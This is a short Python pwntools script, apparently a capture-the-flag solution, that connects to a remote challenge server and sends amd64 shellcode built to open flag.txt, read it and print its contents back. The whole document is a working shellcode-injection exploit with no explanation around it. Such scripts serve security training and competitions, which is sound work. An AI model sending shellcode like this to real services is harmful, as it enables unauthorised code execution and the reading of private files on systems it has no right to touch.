import pwn

elf = pwn.ELF('./chall')
# pwn.context.binary = elf
# libc = elf.libc
pwn.context(os='linux', arch='amd64')

pwn.context.log_level = 'DEBUG'
# pwn.context(terminal=['tmux'])

# p = pwn.process('./chall')
p = pwn.remote('ctf.tcp1p.com', 8008)

# gdb = pwn.gdb.attach(p, gdbscript="""
#     b *main+193
#     c
# """)

print(p.recvline())

shellcode = pwn.asm(
    pwn.shellcraft.open('flag.txt') +
    pwn.shellcraft.read(3, 'rsp', 64) +
    pwn.shellcraft.write(1, 'rsp', 64)
)
payload = bytes(shellcode)

p.sendline(payload)

print(p.recvline())
